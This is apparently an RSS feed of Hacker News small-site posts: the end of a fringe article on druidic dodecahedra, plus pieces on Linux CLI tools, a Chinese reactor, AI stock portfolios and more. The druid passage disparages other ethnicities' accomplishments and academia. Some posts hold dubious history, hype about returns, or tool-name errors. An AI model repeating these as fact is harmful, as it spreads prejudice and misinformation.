<p>In their reports,  archaeologists will often round out measurements of the holes in the dodecahedron faces to the nearest millimetre only, which is grossly insufficient. It's much appreciated by researchers when measurements can be supplied to 1/10th  of a millimetre, but  it is nigh on impossible  to acquire more refined measurements undertaken with electronic vernier callipers. Precise measurements and scaling must precede any serious analysis of these artefacts, but our experts don't seem to think there would be anything significant to find anyway, so don't subject the dodecahedra to rigorous measurement analysis.</p>
<p>Despite the fact that 25.4 millimetres (1 British Standard Inch) or fraction expressions of the same will recur repeatedly in the faces of dodecahedra, no-one seems to have arrived at the conclusion that the enigmatic<em><strong> "inch"</strong></em> recurrence is worthy of serious investigation. </p>
<p>Almost anything considered high-art, technically advanced or an engineering feat within ancient European civilisations seems to be automatically attributed to the Romans, which is certainly the case for these dodecahedra artefacts. This  is a hangover of biased, classicist-isolationist historical  interpretations of  European history where, first came the  Roman conquerors, who finally retreated after centuries of domination, only to be replaced by Rome's State church. With the pedigree of the church being Greco-Roman it was in their interests to push the concept that the Roman armies had found everything in the regions they invaded to be backwards, rudimentary or crude until Rome delivered the great-unwashed masses out of their depravity and into  enlightenment and high-civilisation. </p>
<p>This general process of misattribution further hobbles or seriously limits proper investigation into the purpose and function of dodecahedra artefacts, inasmuch as focus is  directed, almost exclusively, to what Roman armies might have used them for as range-finders or other battle related paraphernalia, including club-heads. The druids or others don't get  any serious consideration, despite the fact that they are historically recorded as having been  advanced mathematicians and astronomers.</p>
<p>Within controlled academia the ability to do open-ended, ground-breaking research can be severely curtailed by the requirements of <em><strong>"peer review"</strong></em> by colleagues.  This is largely a racket that ensures one doesn't move too far from the protected consensus opinion upon which academic reputations are built and anyone venturing too far out into left field is considered a maverick who threatens the insulated central body.</p>
<p>By the same token academia, these days, is lumbered with deep-set social responsibilities and crippling political agendas. When it comes to European history, especially, the requirement is to be self-effacing, while lauding and applauding the (often meager) accomplishments of other ethnicities. Under  guises of political correctness and racial sensitivity, the door is opened for antagonistic non-European, prejudiced individuals, to write and interpret  our history for us, while pushing their own  cultural-Marxist or similar wheel-barrows.  All one has to do is sit through lectures in our western universities to see just how far out of kilter the abysmal problem of  European history-misrepresentation has become.</p>
<p>But, with regards to the dodecahedra artefacts,what one person can build, another can generally duplicate or back-engineer, sufficient to make sense of what's going on. </p>
<p>So, let's cut to the chase, bypass all the  confusion of modern-day naysayers and source testimony directly from an observer who lived contemporary to the druids, before they fell under Roman domination </p>
<p>Julius Caesar, who was a very thorough historian, writes the       following regarding the late era druids of his time (circa 55 BC) and        practices within their many universities in Britain, where students from Gaul       and elsewhere, including Rome, went for training:</p>
<p><strong>'They hold aloof from war and do not pay war taxes; they       are excused from military service and exempt from all liabilities. Tempted       by these great advantages, many young men assemble of their own motion to       receive their training, many are sent by parents and relatives. Report says       that in the schools of the Druids they learn by heart a great number of verses,       and therefore some persons remain twenty years under training'. </strong></p>
<p><strong>'They do not think it proper to commit these utterances to       writing, although in all other matters and in their public and private accounts       they make use of Greek characters. I believe that they have adopted the practice       for two reasons- that they do not wish the rule to become common property,       nor those who learn the rule to rely on writing and so neglect the cultivation       of memory; and, in fact, it does usually happen that the assistance of writing       tends to relax the diligence of the student and the action of memory...They       also lecture on the stars in their motion, the magnitude       of the Earth and its divisions, on natural history, on the power and       government of God; and instruct the youth in these subjects' <em>(see De Ballo       Gallico, VII, 15, 16.).</em></strong></p>
<p>Historian, Isabel Hill Elder  writes, <strong>'The students at these       colleges numbered at times sixty thousand of the youth and young nobility       of Britain and Gaul. Caesar comments on the fact that the Gauls sent their       youth to Britain to be educated...It required twenty years to master the complete       circle of Druidic knowledge. Natural philosophy, astronomy,       mathematics, geometry, medicine, jurisprudence, poetry and oratory       were all proposed and taught-natural philosophy and       astronomy with severe exactitude' (Elder refers to <em>Strabo I IV,       page 197. Caesars Comm. Lib V. Sueotonius, V Calegula. E. Campion, Accounts       of Ireland, pg. 18.).</em></strong></p>
<p>Isabel Hill Elder further writes,<strong> 'The education system       adopted by the Druids is traced to about 1800 BC when Hu Gardarn Hysicion       (Isaacson), or Hu the Mighty, led the first colony of Cymri into Britain from       Defrobane, where Constantinople now stands'.</strong> </p>
<p>Further commenting on Hu       Gardarn Hysicion, Isabel Hill Elder writes that he, <strong>'is commemorated in       Welsh archaeology as having made poetry the vehicle of memory'.</strong> Elsewhere       she writes, he <strong>'is said to have mnemonically systematized the wisdom of       the ancients...'.</strong> She goes on to say,<strong> 'The published compositions of       the Druids and Bards form but a very small portion of the extant remains of       their works. The Myvyrian MSS. alone, now in the British Museum, amount to       47 volumes of poetry, in 1600 pages, besides about 2000 epigrammatic stanzas.       Also in the same collection are 53 volumes of prose, in about 15,300 pages,       containing many curious documents on various subjects...' <em>(see Celt, Druid       and Culdee, pages 54 &amp; 55).</em></strong></p>
<p>With the testimony of Julius Caesar ringing in our ears, lets see how the druids would have used the dodecahedron artefacts as <em><strong>"memory"</strong></em>devices for mathematically encoding astronomical cycles,<em><strong> ("the stars in their motion")</strong></em>, navigation systems <em><strong>("the …</strong></em></p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.celticnz.co.nz/Dodecahedron/Decoding%20the%20Druidic%20Dodecahedron1.html">http://www.celticnz.co.nz/Dodecahedron/Decoding%20the%20Druidic%20Dodecahedron1.html</a></em></p>]]>
            </description>
            <link>http://www.celticnz.co.nz/Dodecahedron/Decoding%20the%20Druidic%20Dodecahedron1.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25237271</guid>
            <pubDate>Sat, 28 Nov 2020 13:03:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Linux (command line interface) CLI tools]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25236863">thread link</a>) | @Vlad81b
<br/>
November 28, 2020 | https://www.vladimircicovic.com/2020/11/top-linux-command-line-interface-cli-tools | <a href="https://web.archive.org/web/*/https://www.vladimircicovic.com/2020/11/top-linux-command-line-interface-cli-tools">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Working in a Linux environment requires knowledge of Linux cli tools and troubleshooting. In this article, it would
be presented CLI tools that are most important for troubleshooting.
Short story
Let say you are working with Linux and your work would be: 1% once-time setup and 99% troubleshooting. So as we can see from these homemade statistics you going to spend most of your time in CLI and finding “why does not work”. This is not a trivial task. It requires knowledge of how Linux works, how subsystems of Linux works,
how complete “line” from typing command up to running, delivering some results works, logs.
Yes, logs are the most important.
So let me start with naming tools and then a short description of some of them.
fs2chk
du/dh
strace/ltrace
lsof
ldd
tcpdump
netstat
mailq/showq
traceroute/tracepath
ping/telnet/nc
dig
curl
nmap
top
ps
pkg manager(rpm, yum, apt, others)
lsmod
awk
sed
vim</p>
<h3>fs2chk</h3>
<p>Used for file system integrity check. Not all time you will have regular shutdown or reboot –
sometimes it happens power goes off and your server gets back with a file system issue. Usually, in that
case is best to use fs2chk</p>
<h3>du/dh</h3>
<p>Command du is used to show space usage per partition. Sometimes happen your partition are used with
some dumb files/logs (crash files) and you need to see what is happening because application or service you try to run report free space issue. Command dh is used to check directory with sub-
directories and discover what file occupied most of the space.</p>
<h3>strace/ltrace</h3>
<p>Running application it just stops at some point. You don’t have logs. Nothing. And there is no debug switch (for example ssh -vvv, where you can see all steps that are done) or any other way to see what is hell going on. So strace is for functions that is used and ltrace are library that are used at some point.
We mostly need trace tool to see details of operation for some applications. Example: we run applications or services and we see an issue and we are not sure why.</p>
<h3>lsof</h3>
<p>You have an issue removing files/files because they are used by some unknown application. Or you want to see how much is open files so you can see if the maximum limit for open files is reached.</p>
<h3>ldd</h3>
<p>When the application does not run at all – the usual suspect is missing the library. This tool is handy to discover which library missing.</p>
<h3>tcpdump</h3>
<p>Connection to server sometimes has issues. So the best way to check what is going on and to troubleshooting is tcpdump. You can pick up the interface, type of protocol, from/to IP, or any low level for all TCP/IP layers.</p>
<h3>netstat</h3>
<p>Simple to see the status of open ports, connection state, and other information that we need to see if services running properly on a given port.</p>
<h3>mailq/showq</h3>
<p>The most vital service in each company is email. And sometimes you need to see what is happening with email (sending or recv). Best tool for this is mailq/showq (it is the same tool, showq is a new one that replace
mailq on older Linux)</p>
<h3>ethtool</h3>
<p>On a low level could happen issue with our ethernet connection and we want to review our cable/port on Linux. So the tool is best for this job. Beside this, you can review other specific ethernet things (auto-negotiation etc)</p>
<h3>traceroute/tracepath</h3>
<p>Ideal to see between server and client if there is a network path issue as also a delay between them.</p>
<h3>ping/telnet/nc</h3>
<p>The very handy tool on the first step to see if is server up as also services.</p>
<h3>dig</h3>
<p>With this tool, you can perform all DNS troubleshooting. Review MX records, A, NS, etc.</p>
<h3>curl</h3>
<p>One of the best tools for troubleshooting different protocols: HTTP, RTMP, FTP, etc. It also has a benchmark integrated for a view of response (DNS, first byte, etc).</p>
<h3>nmap</h3>
<p>A very good tool for discovering services, open ports, and other useful information. Also, you can use on your servers to check if there is some unusual thing and secure them.</p>
<h3>top</h3>
<p>Active process list with memory, CPU, parent/child connection, and other information that helps to see where the issue starts.</p>
<h3>ps</h3>
<p>Process list, you can check and see what is currently running (very quick, the first step for troubleshooting)
pkg manager(rpm, yum, apt, others)
In troubleshooting we need to verify or to find some library or application – so this tool is best for that
operation.</p>
<h3>lsmod</h3>
<p>People who never have issues with kernel modules would never use this tool or get this tool seriously.
The tool provides information about loaded kernel modules as also usage, memory, etc.</p>
<h3>awk/sed/grep</h3>
<p>In a bunch of logs sometimes is a need to find proper information. All these tools are swiss knives for bash scripting and handy for parsing logs for specific information.</p>
<h3>vim</h3>
<p>The best editor in the world. Learn so you can answer on an interview how to quit vim.</p>
</div></div>]]>
            </description>
            <link>https://www.vladimircicovic.com/2020/11/top-linux-command-line-interface-cli-tools</link>
            <guid isPermaLink="false">hacker-news-small-sites-25236863</guid>
            <pubDate>Sat, 28 Nov 2020 10:52:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[First made-in-China nuclear reactor online]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25236824">thread link</a>) | @chefkoch
<br/>
November 28, 2020 | https://www.bangkokpost.com/world/2026891/first-made-in-china-nuclear-reactor-online | <a href="https://web.archive.org/web/*/https://www.bangkokpost.com/world/2026891/first-made-in-china-nuclear-reactor-online">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
							<!-- article-news detail -->
							<div>
								<article>
									
									<div>
										<h2>
											First made-in-China nuclear reactor online										</h2>
										<p>Hualong One debut seen as milestone in drive to reduce dependence on Western technology</p>									</div>
																		<div id="position-set">
										<div>
											<p>published :
													28 Nov 2020 at 16:03												</p>
											
										</div>
									</div>
									
									<!-- show ipad and mobile only -->
									
									<!-- /show ipad and mobile only -->

									<div>
																					<div>
												<figure>
													<img data-img-highlight="1" src="https://static.bangkokpost.com/media/content/20201128/c1_2026891.jpg" alt="The Taishan complex in Guangdong is one of 47 nuclear power plants in China, where another 13 are under construction. (Photo: EDF Energy via Wikimedia Commons)" title="The Taishan complex in Guangdong is one of 47 nuclear power plants in China, where another 13 are under construction. (Photo: EDF Energy via Wikimedia Commons)">
												</figure>
																								<figcaption>
													The Taishan complex in Guangdong is one of 47 nuclear power plants in China, where another 13 are under construction. (Photo: EDF Energy via Wikimedia Commons)												</figcaption>
												
											</div>
																				<p>BEIJING: China has powered up its first domestically developed nuclear reactor — Hualong One — a significant step in Beijing’s attempts to become less dependent on Western countries for energy security and critical technology.</p>
<p>The reactor, which was connected to the national grid on Friday, can generate 10 billion kilowatt-hours of electricity each year and cut carbon emissions by 8.16 million tonnes, according to China National Nuclear Corporation (CNNC).</p>
<p>“This marks China breaking the monopoly of foreign nuclear power technology and officially entering the technology’s first batch of advanced countries,” CNNC said in a statement.</p>
<p>Nuclear plants supplied less than 5% of China’s annual electricity needs in 2019, according to the National Energy Administration, but this share is expected to grow as Beijing attempts to become carbon-neutral by 2060.</p>
<p>Reducing its dependence on Western allies in critical high-tech sectors such as power generation is a key goal in Beijing’s “Made in China 2025” plan.</p>
<p>Billions of dollars in state subsidies have been given to Chinese companies to speed the process — a move that has angered China’s trade partners and sparked a protracted trade row with Washington.</p>
<p>Work on the Hualong One reactor started in 2015 and there are currently six other reactors under construction at home and abroad, the state-owned plant operator CNNC said.</p>
<p>The Hualong One, deployed at a plant in the eastern province of Fujian, will be put into commercial use by the end of the year after undergoing tests.</p>
<p>China has 47 nuclear plants with a total generating capacity of 48.75 Gigawatts — the world’s third highest after the United States and France.</p>
<p>Beijing has invested billions of dollars to develop its nuclear energy sector in recent years as it struggles to wean its economy from coal.</p>
<p>Thirteen nuclear plants are under construction, more than in any other country, despite environmental and safety concerns.</p>
<p>In August 2016, officials were forced to shelve plans for a nuclear waste facility in Lianyungang, a city in eastern Jiangsu province, after a rare public protest by thousands of residents.</p>									</div>

									
									

																			
										<hr>
																			<div><p>
											Do you like the content of this article?
											</p>
										</div>
																		
																	</article>

							</div>
							<!-- /article-news detail -->
						</div></div>]]>
            </description>
            <link>https://www.bangkokpost.com/world/2026891/first-made-in-china-nuclear-reactor-online</link>
            <guid isPermaLink="false">hacker-news-small-sites-25236824</guid>
            <pubDate>Sat, 28 Nov 2020 10:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Beating the Markets with Artificial Intelligence Driven Portfolios]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25236677">thread link</a>) | @hydershykh
<br/>
November 28, 2020 | https://tradytics.com/blog/beating-the-market-with-ai-driven-portfolios | <a href="https://web.archive.org/web/*/https://tradytics.com/blog/beating-the-market-with-ai-driven-portfolios">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <div>
                    <div>
                        <article>
                            <div>
                                
                                <p>

Quantitative finance is an inherently secretive field where people who become profitable never reveal their secret formulas of success. However, this has started to change in recent years thanks to the likes of <a href="https://www.amazon.com/Advances-Financial-Machine-Learning-Marcos/dp/1119482089">Marcos Lopez de Prado</a>, <a href="https://www.amazon.com/Algorithmic-Trading-Winning-Strategies-Rationale/dp/1118460146">Ernest Chan</a>, and others. Although algorithmic trading remains a difficult problem to solve, the knowledge that these people have given to the public is invaluable. At Tradytics, we are continuously reading the latest research and trying new ideas to create profitable trading algorithms. <b>Today, we are going to talk about one such AI system that has resulted in us beating the market by 20% in the last 1 month</b>. Although this time period is very short, we want to give others a taste of how things work at Tradytics and how we go about solving different problems. We are also going to continue creating automated systems with an intent to consistently beat the market. <b>Let us now talk about how we created 5 AI driven portfolios that each gained over 30% returns in the last 30 days.</b>

</p>





<h3> A Million Portfolios </h3>

<p>

Let's start with a basic idea of what we do before diving into the details. 

</p><blockquote>

	<p>We generate millions of random portfolios, optimize their allocation using existing and proprietary portfolio optimization algorithms, and rank them using our AI engine.</p></blockquote>



<p>There has been thousands of papers on portfolio optimization in the last three decades. Starting with <a href="https://www.investopedia.com/terms/m/modernportfoliotheory.asp">markowitz portfolio optimization theory</a> to the more recent <a href="https://www.coursera.org/learn/trading-strategies-reinforcement-learning">reinforcement learning based optimization</a> methods, there are countless research papers to read and implement. However, as is the case with the majority of proposed methods in literature, the portfolios are created based on historical returns. If there is one thing we know about the stock market, it's that historical returns are not always representatives of future returns. This is a major problem that one needs to solve in order to create effective portfolios. As market regimes change, algorithms that were based on historical data suddenly become ineffective. Therefore, we need a way to combine the literature with a novel mechanism of adding some predictive power to our portfolio optimization strategies.</p>





<h4> Portfolio Optimization Strategies at Tradytics </h4>

<p>

	At Tradytics, we use 3 strategies from literature and two proprietary ones based on genetic algorithms. These strategies are:

	</p><ul>

		<li><a href="https://www.thebalance.com/minimum-variance-portfolio-overview-4155796">Minimum Variance Portfolio (MVP)</a></li>

		<li><a href="https://logical-invest.com/app/portfolio/maxsharpe/max-sharpe-portfolio">Maximum Sharpe Portfolio (MSR)</a></li>

		<li><a href="https://papers.ssrn.com/sol3/papers.cfm?abstract_id=3070416">Eigen Portfolios</a></li>

		<li>Genetic Portfolios (GA)</li>

		<li>Exponential Genetic Portfolios</li>

	</ul>

	<p>MVP, MSR, Eigen, and GA based portfolio optimizations have been studied in the literature in depth and many trading firms still use them. This is where we start as well but we add something important on top to make these strategies work well. As we said in the start of this section, our basic idea is to generate millions of random portfolios and rank them using our custom AI algorithms. The ranking system is where our novelty comes in. The following image visually explains our portfolio selection process.</p>

	<p> 

	<img src="https://i.ibb.co/m4N3gB4/block-diagram.png"></p><p>After generating millions of portfolios and optimizing their weights with the aforementioned strategies, we use our proprietary ranking system that ranks all these portfolios in terms of their future predicted returns. We keep the best portfolio for each of the five strategies which goes to our website at <a href="https://tradytics.com/ai-portfolios.">Tradytics AI Portfolios</a>. Let us now dive a bit deep into the portfolio generation and selection process.</p>





<h4> Portfolio Generation: A Case of 25 Random Portfolios </h4>

<div><p>

	The image below shows 25 random portfolios from a collection of millions of portfolios we generated on October 31st. We start with selecting 5 random stocks for every portfolio and optimize the portfolio on 1 year of historical data up till October 23rd. After optimization, we backtest the portfolios to look at their historical returns. Since optimization is being done on historical data, the backtested returns are expected to be high which is what we can see in the image below.

	</p><p> 

	<img src="https://i.ibb.co/gVM2VrD/backtest-returns.png"></p><p> 

	However, there is a huge problem here. Our optimization procedure only looks at historical data and has no inherent predictive power. It implicitly makes an assumption that historical returns are predictive of future returns. This is not always true and solely relying on this assumption can lead to huge losses. We can see this if we forward test our 25 portfolios from October 23rd to October 31st, 2020. 

	</p><p> 

	<img src="https://i.ibb.co/CQmyFQY/forward-returns.png"></p><p> 

	Although profitable on historical data, the portfolios are all at loss when ran live - some are down 20% in a week. This illustrates the problem at hand with portfolio optimization methods. Let us try to solve it.

</p></div>





<h3> Portfolio Selection: Tradytics AI Ranking </h3>



<p>

At Tradytics, we go one step further from portfolio optimization. Once we get these millions of optimized portfolios, we use our proprietary AI ranking algorithm to rank them based on what the AI thinks will be their future returns. The ranking procedure is basically a predictive model that predicts the returns of portfolios based on their allocation by the optimization method, their spreads with each other, and their historical returns. Once the ranking is done, we simply pick the best portfolio from each of the five strategies noted above, thus giving us 5 portfolios every month. Our main goal with these portfolios is to generate large returns and consistently beat the market. In order to preserve our alpha, we will not give any technical details away regarding our ranking system.

</p>



<div><p>

The first set of portfolios we generated was on October 31st. Our top 5 portfolios had the following allocations and stocks in them. The green weights indicate longing the stock while the red weights suggest shorting.

</p><p> 

<img src="https://i.ibb.co/kqn36Gv/allocation.png"></p></div><p>

At the time of creating these portfolios, the weights did not make much sense by simply looking at each individual stock. However, since the ranking engine has been trained on a large amount of data and has high predictive power, it extracted certain patterns that made it confident that these portfolios would end up being profitable. Let us take a look at the returns of each individual stock as well as the entire portfolio.</p>





<h4> Portfolio Results: Top 5 Portfolios from October </h4>

<div><p>When looking at the backtest results of the top portfolios, it is easy to see that the historical returns are quite volatile would yield a low sharpe ratio. However, since history is not always the future and our ranking engine is tasked to predict the future returns, these portfolios were selected because of high AI confidence in larger returns.

</p><p> 

	<img src="https://i.ibb.co/Mcgj8HV/picked-backtest-returns.png"></p><p> 



When these 5 portfolios were run live for the month of November, these yielded very high returns as compared to the market. The <b>$SPY</b> index gained about <b>10%</b> in the month of November. The following image shows the gains of each of our portfolios.</p><p> 

<img src="https://i.ibb.co/PTPnqcj/portfolio-returns.png"></p></div><p>The results are quite impressive. All portfolios have garnered gains of above <b>30% in just 30 days</b> with some of them touching about <b>40%</b> cumulative returns. Now, we admit that there is a bias in the results here because of the strong bull market in the month of November. However, when the AI was ranking these portfolios, the bull market was not very strong - <b>$SPY</b> was down <b>2%</b> in October. It was the ranking engine that was able to find predictive patterns in the portfolios which would eventually result in large profits. This demonstrates the effectiveness of using machine learning and artificial intelligence in portfolio selection.</p>





<h3> What's Next </h3>

<p>

Tradytics is a fairly new company in the quantitative finance game. We realize that these are short term results and we need to show consistency before we can make any claims about the AI capabilities of our toolkits. Our plan is to keep adding these portfolios every month and record the performance for atleast one year. The hope here is to consistently beat the market with significantly high returns. We will keep you updated. If you have any questions, please do not hesitate to reach out to us at our <a href="https://discord.gg/QuvE2Z8">Discord</a>.

</p>


                            </div>
                        </article>
                    </div>
                    <!-- end of single card col-->
                </div>
                <!-- end of blog post row -->
            </div></div>]]>
            </description>
            <link>https://tradytics.com/blog/beating-the-market-with-ai-driven-portfolios</link>
            <guid isPermaLink="false">hacker-news-small-sites-25236677</guid>
            <pubDate>Sat, 28 Nov 2020 10:09:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Interpretable Machine Learning]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25236675">thread link</a>) | @e2e4
<br/>
November 28, 2020 | https://christophm.github.io/interpretable-ml-book/ | <a href="https://web.archive.org/web/*/https://christophm.github.io/interpretable-ml-book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        

        <div tabindex="-1" role="main">
          <div>

            <section id="section-">

<div id="summary">

<p><img src="https://christophm.github.io/interpretable-ml-book/images/title_page.jpg" width="500"></p>
<p>Machine learning has great potential for improving products, processes and research. But <strong>computers usually do not explain their predictions</strong> which is a barrier to the adoption of machine learning. This book is about making machine learning models and their decisions interpretable.</p>
<p>After exploring the concepts of interpretability, you will learn about simple, <strong>interpretable models</strong> such as decision trees, decision rules and linear regression. Later chapters focus on general model-agnostic methods for <strong>interpreting black box models</strong> like feature importance and accumulated local effects and explaining individual predictions with Shapley values and LIME.</p>
<p>All interpretation methods are explained in depth and discussed critically. How do they work under the hood? What are their strengths and weaknesses? How can their outputs be interpreted? This book will enable you to select and correctly apply the interpretation method that is most suitable for your machine learning project.</p>
<p>The book focuses on machine learning models for tabular data (also called relational or structured data) and less on computer vision and natural language processing tasks. Reading the book is recommended for machine learning practitioners, data scientists, statisticians, and anyone else interested in making machine learning models interpretable.</p>
<p>You can buy the PDF and e-book version (epub, mobi) <a href="https://leanpub.com/interpretable-machine-learning">on leanpub.com</a>.</p>
<p>You can buy the print version <a href="http://www.lulu.com/shop/christoph-molnar/interpretable-machine-learning/paperback/product-24036234.html">on lulu.com</a>.</p>
<p><strong>About me:</strong> My name is Christoph Molnar, I'm a statistician and a machine learner. My goal is to make machine learning interpretable.</p>
<p>Mail: <a href="mailto:christoph.molnar.ai@gmail.com">christoph.molnar.ai@gmail.com</a></p>
<p>Website: <a href="https://christophm.github.io/">https://christophm.github.io/</a></p>
<p>Follow me on Twitter! <a href="https://twitter.com/ChristophMolnar">@ChristophMolnar</a></p>
<p>Cover by <a href="https://twitter.com/YvonneDoinel">@YvonneDoinel</a></p>
<div>
<p><img src="https://christophm.github.io/interpretable-ml-book/images/by-nc-sa.png" alt="Creative Commons License"></p><p>Creative Commons License</p>
</div>
<p>This book is licensed under the <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.</p>
</div>
            </section>

          </div>
        </div>
      </div></div>]]>
            </description>
            <link>https://christophm.github.io/interpretable-ml-book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25236675</guid>
            <pubDate>Sat, 28 Nov 2020 10:08:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Permissionless Apprenticeship]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25236350">thread link</a>) | @vitabenes
<br/>
November 28, 2020 | https://www.value.app/feed/permissionless-apprenticeship-ryan-doyle | <a href="https://web.archive.org/web/*/https://www.value.app/feed/permissionless-apprenticeship-ryan-doyle">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><em>Guest author: </em><a href="https://twitter.com/ryan___doyle"><em>Ryan Doyle</em></a><em>.<br></em></p><p>I grew up on a crop farm in the Finger Lakes of New York. When I was eighteen, I had the opportunity to go to school in Los Angeles. For the first time since my great grandmother came here from Ireland, a Doyle left the “middle finger” of NY.<br></p><p>For four years, I studied “business.” For someone used to working with their hands, it was an uncomfortable amount of theory. Outside of my classes, I was tinkering. Projects like a bitcoin brokerage, seeking a patent for a garden tool, and a few ecommerce shops became my bridge between theory and action.<br></p><figure id="w-node-301981ba2eb8-f921d246"><p><img src="https://uploads-ssl.webflow.com/5f4c1c4bc17267761b21d253/5fbec1e09b509d00db535009_Zenb_bZC0Ru9U1T6r_e18Btl3jkmLftJ5wgKpgveNW5hxfeWyNreW-f9lDxexy1XCN_Q-RJ5LmUxnsx1QJTPUOIRdHby5cpAnQQO_rxLyoF89Ns5ZhBqe2pX3vLwY4u9Sw.jpeg" alt=""></p></figure><p>Quickly, building became my passion. As I graduated, I joined a software startup in Palo Alto to smile-and-dial as an entry-level sales person. I figured I’d see how these companies were built from the inside out so I could emulate it someday.<br></p><p>Hustle and elbow grease took me from that role, to another startup in NYC, where I helped build the sales team. I went from phone jockey to deal-closer. On my nights and weekends, I was teaching myself to code.</p><p><br>One of those nights, I found Visualize Value on Twitter. The simple theories resonated with my action-oriented mindset. In particular, the idea of a <strong>Permissionless Apprenticeship</strong>. (<a href="https://twitter.com/jackbutcher/status/1261139777061113858?lang=en">link to tweet thread</a>)<br></p><p>This was something I was already doing in sales. I’d see a company that might be worth a few million dollars to the company. I’d live their brand for a few days, experiencing everything I could. Then I’d compile it and send it to the highest executive I could find, showing the gap we could fill.<br></p><h3>It had the highest return on time of anything I did. <br></h3><p>In the VV community of designers and makers, I accidentally found out that this was valued by anybody in business, not just Fortune 500 companies. I started doing “Free Sales Advice Friday,” and business owners would share what they were working on. I would reply with scrappy tactics to go out and find new customers, specifically for their business. </p><figure id="w-node-1ed3a476e59c-f921d246"><p><img src="https://uploads-ssl.webflow.com/5f4c1c4bc17267761b21d253/5fbec238bc87551cc41f9091_SBYXJoLLf8A93EpVRlXUzHAg9WB-jV66ry6jmT-imj15yB8FWSyI0I30xN_Vt3e7QVL4i0yxUoIDuQ_3pjeU_-buVwkKgWt-IVLB_ZmEOlzI91RTg3W6cdmATD8V6XMqsA.png" alt=""></p></figure><p>‍</p><p><em>"Some of the best help I've received online, thank you."&nbsp;—&nbsp;Jordan Godbey</em></p><p><em>"That is superb advice." —&nbsp;Andy Whyte</em></p><p><em>"Ryan, this thread is gold!"&nbsp;—&nbsp;Ben Ford<br>‍</em></p><p>I didn’t think too much of the feedback and kept working on my sales job. But I knew, mentally and emotionally, I was ready to make the leap into something of my own. I could code. I could sell. The pandemic provided the perfect reason to hide away for a year and hustle, nobody was hanging out without me anyhow.<br></p><p>In August, I quit my job, moved back to the farm to extend my runway, and committed myself to building. I felt like I had the skills I needed. The community was there through my sales work. I hadn’t realized it yet, but the community was there through Visualize Value as well.</p><p>I hoped salespeople would care about what I was building. <strong>As I applied my sales advice to my own software project, I found that more builders cared about how I approached sales. </strong>In months of Free Sales Advice Fridays, I advised 100+ business owners and explored so many different angles they could take.<br></p><p>There was already sales advice out on the internet. But the message didn’t matter to these people, the medium did. And I was the medium. To tap into that I built a small guide on pre-selling your product to customers and tested the offer of a premium newsletter. Then this happened:<br></p><figure id="w-node-b130da7c6edb-f921d246"><p><img src="https://uploads-ssl.webflow.com/5f4c1c4bc17267761b21d253/5fbec29f91c0ddef19a5840c_vO6r4tsysvvlePHfASruxWYEHU110pu8Z7TTAT-rcyVbeRxEeKK0YK0RFG3nqC-uqzIJA39A8_2JPvM3foisdyBXsYbgPiWzhz8M4AdWzt52IJ_F8zh6uK8xqSiwiZCEDw.png" alt=""></p></figure><p>On day 1, I hit $170 MRR. More revenue than I was making from my software project. Almost entirely profit. From what was already in my head. It was astonishing to me, that something so innate to me was worthy of an individual’s money.<br></p><h3>By sharing that innate knowledge through Free Sales Advice Friday, I was really embodying the permissionless apprenticeship. Every week I was able to hone my message in a zero-stakes, zero-permission environment. <br></h3><p>If I hadn’t sought out ways to provide free value, I wouldn’t have realize what people would pay me for. By the time I discovered what people wanted to pay for, I had built up enough “brand equity” for early adopters to trust me.<br></p><p>I’m still building my software projects. But my early adopters for my sales guides will allow me to do so with an audience who will test and support me, while paying me for the opportunity to do so.<br></p><p>I still do Free Sales Advice Fridays and stay active in the <a href="https://shop.visualizevalue.com/products/membership">Visualize Value Community</a>. When you join, look out for the weekly post in #general. Looking forward to giving you sales advice, too :)</p></div></div></div>]]>
            </description>
            <link>https://www.value.app/feed/permissionless-apprenticeship-ryan-doyle</link>
            <guid isPermaLink="false">hacker-news-small-sites-25236350</guid>
            <pubDate>Sat, 28 Nov 2020 08:54:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Generalized f-Mean]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25236328">thread link</a>) | @goldenkey
<br/>
November 28, 2020 | https://churchofthought.org/blog/2017/03/26/the-generalized-mean-an-algorithmic-approach/ | <a href="https://web.archive.org/web/*/https://churchofthought.org/blog/2017/03/26/the-generalized-mean-an-algorithmic-approach/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			<p>In school, we are first taught the arithmetic mean, then later the geometric mean, and maybe one or two others like the harmonic/contraharmonic mean.</p>
<p>But most teachers do not teach the logic or derivation behind these means. They merely provide the formulas and perhaps provide some scenarios where each mean would be more useful than the others.</p>
<p>I’d like to illustrate the definition of a mean, in the most abstract sense, from a programmer’s perspective, an algorithmic point of view.</p>
<h2>A Balancing Act</h2>
<hr>
<p>Suppose we have a list of N numbers, and a binary operation $f(a,b)$</p>
<p>If we apply that binary operation to one number from the list, we must&nbsp;apply its inverse operation to another number from the list.</p>
